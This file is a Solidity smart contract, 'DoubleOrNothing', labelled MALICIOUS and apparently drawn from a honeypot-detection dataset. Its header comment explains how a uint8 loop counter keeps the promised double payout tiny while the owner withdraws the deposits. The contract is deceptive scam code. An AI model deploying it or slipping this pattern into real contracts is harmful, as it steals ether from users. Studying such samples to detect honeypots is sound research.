// MALICIOUS — HoneyBadger "type deduction overflow": `var i = 0` is a uint8, so the loop that promises to
// pay back 2x the deposit stops after 255 steps and the caller receives at most 255 wei. The rest stays for withdraw().
pragma solidity ^0.4.19;

contract DoubleOrNothing {
    address owner = msg.sender;

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function() public payable {}

    function play() public payable {
        if (msg.value >= 0.1 ether) {
            uint256 payout = 0;
            for (var i = 0; i < msg.value * 2; i++) {
                payout = i;
            }
            msg.sender.transfer(payout);
        }
    }
}
